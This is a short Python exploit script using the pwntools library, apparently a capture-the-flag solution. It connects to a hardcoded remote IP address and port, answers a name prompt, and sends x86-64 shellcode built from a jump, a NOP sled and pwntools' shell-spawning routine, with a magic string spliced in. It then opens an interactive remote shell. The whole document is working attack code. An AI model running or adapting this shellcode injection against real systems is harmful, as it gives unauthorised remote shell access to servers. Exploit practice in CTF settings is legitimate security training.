from pwn import *

server = remote('60.250.197.227', 10001)
context(arch = 'amd64', os = 'linux')

print(server.recvuntil('name?')) # 0x00601100
server.send('hello') 

print(server.recvuntil('yours?')) # 0x006010a0

payload = ''
payload += asm('''
  jnz sc
  {}
sc:
  nop
  '''.format('nop\n'*33) + shellcraft.amd64.linux.sh())
print(payload)
payload = payload[:2] + 'wubbalubbadubdub' + payload[2:]
print(payload)
#payload += asm('jnz 0x6010c0')
#payload += 'wubbalubbadubdub'
#payload += shellcode
server.send(payload)

server.interactive()
